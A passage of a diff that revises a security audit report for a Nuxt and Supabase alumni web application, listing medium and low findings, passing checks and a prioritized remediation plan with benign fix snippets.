-**File:** `nuxt.config.ts` (line 52)
+**File:** `app/composables/useImageUpload.ts` lines 30–38
 
-With `redirect: false`, every new protected page MUST remember to add `middleware: 'member-auth'` or `middleware: 'admin-auth'`. If a developer forgets, the page is unprotected (except by RLS).
+`file.type` is client-controlled. No file extension validation or magic byte checking. An SVG with embedded JavaScript or an HTML file could be uploaded and served inline.
 
-**Recommendation:** Document the requirement clearly, or consider switching to `redirect: true` for an additional safety net.
+**Remediation:** Validate extension against allowlist. Set `Content-Disposition: attachment` on storage buckets. Add Supabase Storage bucket-level file type restrictions.
+
+---
+
+### M-14. Pages accessible without middleware (still open from #10)
+
+Pages that query member-restricted tables but have no route middleware:
+
+| Page | Current protection |
+|------|--------------------|
+| `app/pages/news/index.vue` | RLS only |
+| `app/pages/jobs/index.vue` | RLS only |
+| `app/pages/events/index.vue` | RLS only |
+
+Users see empty content instead of being redirected to login.
+
+---
+
+### M-15. Client-side mutations lack input length validation (still open from #11)
+
+| Composable | Function | Issue |
+|------------|----------|-------|
+| `useFeed.ts` | `createPost()` | No content length limit |
+| `useFeed.ts` | `addComment()` | No comment length limit |
+| `useMembers.ts` | `fetchDirectory()` | Search string unbounded |
+| `useMembers.ts` | `saveSocialLink()` | No URL validation or length limit |
+| `useNews.ts` | `fetchArticles()` | Search string unbounded |
+| `useJobs.ts` | `fetchJobs()` | Search string unbounded |
+
+---
+
+### M-16. Auth store `loadProfile` uses `useSupabaseUser()` fallback — NEW
+
+**File:** `app/stores/auth.ts` lines 16–19
+
+When `userId` is not passed, falls back to `useSupabaseUser()` (client-side ref, not server-verified). Could be stale after token expiration. Middleware calls with explicit userId (safe), but future callers could invoke without.
+
+**Remediation:** Remove the `useSupabaseUser()` fallback. Always require a server-verified `userId`.
 
 ---
 
 ## Low / Informational
 
-### 15. Forgot-password rate limiting is in-memory only
+### L-1. Devtools enabled unconditionally (still open from #18)
 
-**File:** `server/api/auth/forgot-password.post.ts`
+**File:** `nuxt.config.ts` line 6: `devtools: { enabled: true }`
 
-The rate limit uses an in-memory `Map`, which resets on server restart and doesn't work across multiple server instances.
-
-**Impact:** Low in single-instance deployments. In scaled deployments, each instance has its own rate limit state.
-
-**Recommendation:** Acceptable for now. If scaling to multiple instances, switch to Redis or Supabase-backed rate limiting.
+**Remediation:** `devtools: { enabled: process.env.NODE_ENV !== 'production' }`
 
 ---
 
-### 16. Registration auto-confirms email
+### L-2. In-memory rate limiting resets on restart (still open from #15)
 
-**File:** `server/api/auth/register.post.ts` (line ~26)
+**Files:** `register.post.ts` line 13, `forgot-password.post.ts` line 3
 
-```ts
-email_confirm: true // auto-confirms without actual email verification
-```
-
-Users can register with fake emails. Partially mitigated by admin approval flow.
-
-**Recommendation:** Set `email_confirm: false` if email verification is desired, or accept the risk given admin approval is required.
+`Map<string, number>` resets on server restart, doesn't work across instances, grows unbounded (no TTL cleanup).
 
 ---
 
-### 17. Partial failure cleanup in registration silently swallows errors
+### L-3. Registration auto-confirms email (still open from #16)
 
-**File:** `server/api/auth/register.post.ts` (line ~56)
+**File:** `register.post.ts` line 46: `email_confirm: true`
+
+Users can register with fake/disposable emails. Partially mitigated by admin approval.
+
+---
+
+### L-4. `admin-create-member.post.ts` silently swallows cleanup error
+
+**File:** `server/api/auth/admin-create-member.post.ts` line 81
 
 ```ts
 await adminSupabase.auth.admin.deleteUser(userId).catch(() => {})
 ```
 
-**Impact:** Orphaned auth users without profiles. Low probability.
-
-**Recommendation:** Log the cleanup failure.
+Unlike `register.post.ts` (now logs errors), this route still silently swallows, leaving orphaned auth users.
 
 ---
 
-### 18. Devtools enabled unconditionally
+### L-5. `.env.example` contains real Supabase project URL
 
-**File:** `nuxt.config.ts` (line 6)
+**File:** `.env.example` line 1: `SUPABASE_URL=https://vrvweamohqaoepjigqiu.supabase.co`
 
-```ts
-devtools: { enabled: true }
-```
+Reveals the project identifier. Replace with placeholder.
 
-Nuxt DevTools should be disabled in production builds to prevent information disclosure.
+---
+
+### L-6. No server-side audit logging — NEW
+
+None of the admin action routes (`approve`, `reject`, `suspend`, `admin-create-member`) write to the `audit_log` table, despite it existing with proper RLS policies. Admin actions are untracked.
+
+---
+
+### L-7. Middleware error handling gaps (still open from #12)
+
+**Files:** `app/middleware/member-auth.ts`, `app/middleware/admin-auth.ts`
+
+Neither destructures `error` from Supabase queries. On outage, users silently redirected to login with no logging.
 
 **Remediation:**
-
 ```ts
-devtools: { enabled: process.env.NODE_ENV !== 'production' }
+const { data, error } = await supabase.from('alumni_profiles').select('status').eq('id', user.id).single()
+if (error) {
+  console.error('Auth middleware: profile query failed', error)
+}
 ```
 
 ---
 
-## Passing (no issues found)
+### L-8. `viewer` admin role has no capabilities — NEW
+
+**File:** `supabase/migrations/001_initial_schema.sql` line 376
+
+`CHECK (role IN ('admin', 'editor', 'viewer'))` — but `is_admin_user()` only returns true for `admin` and `editor`. The `viewer` role is effectively useless.
+
+---
+
+### L-9. No login attempt logging — NEW
+
+**Files:** `app/pages/login.vue`, `app/pages/admin/login.vue`
+
+Failed login attempts are not logged server-side. No rate limiting on login pages. Brute-force attacks go undetected.
+
+---
+
+### L-10. No custom error page — stack traces may leak — NEW
+
+`app/error.vue` does not exist. Nuxt's default error handler may expose stack traces and file paths in production.
+
+---
+
+### L-11. `article_tag_relations` SELECT policy too permissive — NEW
+
+**File:** `supabase/migrations/002_rls_policies.sql` lines 223–224
+
+```sql
+CREATE POLICY "Public read article_tag_relations" ON article_tag_relations FOR SELECT
+  USING (true);
+```
+
+Leaks tag associations for draft/archived articles.
+
+---
+
+### L-12. `event_rsvps` visible to all active alumni — privacy concern — NEW
+
+**File:** `supabase/migrations/002_rls_policies.sql` lines 191–192
+
+Any active alumni can see ALL RSVPs for ALL events, including which member is attending what. Members may not want others to see their RSVP history.
+
+---
+
+## Passing (verified secure)
 
 | Area | Status |
 |------|--------|
 | `.env` not tracked in git | `.gitignore` correctly excludes `.env`. Verified via `git ls-files`. |
 | Service role key server-only | Key is in `runtimeConfig` (not `runtimeConfig.public`). Not exposed to client bundle. |
 | Resend API key server-only | `resendApiKey` is in `runtimeConfig` (server-only). Never accessible from client. |
-| RLS policy coverage | Comprehensive policies on all tables. Helper functions use `SECURITY DEFINER` to prevent recursion. |
-| Middleware uses reliable auth check | Both middlewares use `supabase.auth.getUser()` (async server call), not the unreliable `useSupabaseUser()` reactive ref. |
-| Email notifications fail silently | `sendEmail()` never throws — email failures don't block registration, approval, or other operations. |
-| No service role key on client | Grep confirms key only appears in `.env`, `.env.example`, `nuxt.config.ts`, and `server/api/` routes. |
-| Password reset has rate limiting | `forgot-password.post.ts` implements 60s per-email cooldown and returns generic message (no user enumeration). |
+| RLS policy coverage | All tables have RLS enabled with policies. |
+| `SECURITY DEFINER` RLS helpers | `is_admin_user()`, `is_super_admin()`, `is_active_alumni()` prevent infinite recursion in policies. |
+| Admin identity from server session | All 4 admin routes use `serverSupabaseClient` + `getUser()`. |
+| Middleware uses `getUser()` | Both middlewares use async server call, not the unreliable `useSupabaseUser()` reactive ref. |
+| Registration input validation | Comprehensive Zod schema with proper constraints. |
+| Registration rate limiting | 60s per-email cooldown present. |
+| Forgot-password enumeration protection | Returns same generic message regardless of email existence. |
+| Email failures non-blocking | `sendEmail()` never throws — email failures don't block operations. |
+| SQL injection | All Supabase queries use parameterized PostgREST API. |
+| No sensitive data in `localStorage` | Auth state managed via Supabase cookie-based sessions and Pinia store. No `localStorage`/`sessionStorage` usage. |
 
 ---
 
@@ -545,14 +616,30 @@ devtools: { enabled: process.env.NODE_ENV !== 'production' }
 
 | Priority | Action | Effort | Findings |
 |----------|--------|--------|----------|
-| ~~1~~ | ~~**Fix admin verification** — extract user ID from auth session, not request body~~ | ~~2 hours~~ | ~~#1, #2~~ DONE |
-| ~~2~~ | ~~**Fix RLS self-approval** — restrict alumni from updating sensitive columns~~ | ~~1 hour~~ | ~~#5~~ DONE |
-| 3 | **Install DOMPurify** — replace custom sanitizer + add render-time sanitization | ~1.5 hours | #3 |
-| 4 | **Add CSRF / origin validation** to all POST server routes | ~1 hour | #6 |
-| ~~5~~ | ~~**Add Zod validation + rate limiting** to registration endpoint~~ | ~~1.5 hours~~ | ~~#4~~ DONE |
-| 6 | **Normalize emails** to lowercase in registration + add case-insensitive index | ~30 min | #8 |
-| 7 | **Configure Supabase cookies** and restrict CORS origins | ~30 min | #7, #9 |
-| 8 | **Add middleware** to unprotected member pages | ~15 min | #10 |
-| 9 | **Add input length validation** to composable mutations | ~1 hour | #11 |
-| 10 | **Fix middleware error handling** — log errors, distinguish query failure from not-found | ~30 min | #12 |
-| 11 | **Disable devtools in production** | ~5 min | #18 |
+| **P0** | **Rotate all Supabase keys immediately** | 15 min | C-1 |
+| **P0** | ~~**Install DOMPurify + render-time sanitization**~~ | ~~2 hours~~ | ~~C-2~~ DONE |
+| **P0** | ~~**Add `SET search_path = public` to all SECURITY DEFINER functions**~~ | ~~30 min~~ | ~~C-3~~ DONE |
+| **P1** | **Add CSRF origin validation** (server middleware) | 1 hour | H-1 |
+| **P1** | **Restrict CORS origins** | 15 min | H-2 |
+| **P1** | **Add security headers** (server middleware) | 30 min | H-4 |
+| **P1** | **Remove SWR from auth-protected routes** | 15 min | H-5 |
+| **P1** | **Fix `protect_sensitive_profile_fields` trigger bypass** | 15 min | H-7 |
+| **P2** | **Configure Supabase cookie options** | 15 min | H-3 |
+| **P2** | **Split editor/admin RLS policies** | 2 hours | H-6 |
+| **P2** | **Protect feed post admin-only fields** (trigger) | 30 min | H-9 |
+| **P2** | **Enforce profile privacy flags at DB level** (view) | 1 hour | H-8 |
+| **P2** | **Validate URLs before rendering in href** | 30 min | M-9 |
+| **P3** | **Add Zod validation to admin-create-member** | 30 min | M-1 |
+| **P3** | **Replace raw error messages with generic ones** | 30 min | M-2 |
+| **P3** | **Sanitize search input in composables** | 30 min | M-3 |
+| **P3** | **Add rate limiting to change-password** | 30 min | M-4 |
+| **P3** | **Validate ids/id parameters in member routes** | 30 min | M-6, M-7 |
+| **P3** | **Add `@nuxt/image` domain restrictions** | 15 min | M-10 |
+| **P3** | **Fix reset-password to use `getUser()`** | 15 min | M-11 |
+| **P3** | **Add middleware to unprotected member pages** | 15 min | M-14 |
+| **P3** | **Add case-insensitive email index** | 15 min | M-8 |
+| **P3** | **Add input length validation to composables** | 1 hour | M-15 |
+| **P4** | **Disable devtools in production** | 5 min | L-1 |
+| **P4** | **Create custom error.vue** | 30 min | L-10 |
+| **P4** | **Add audit logging to admin actions** | 1 hour | L-6 |
+| **P4** | **Add middleware error handling** | 15 min | L-7 |
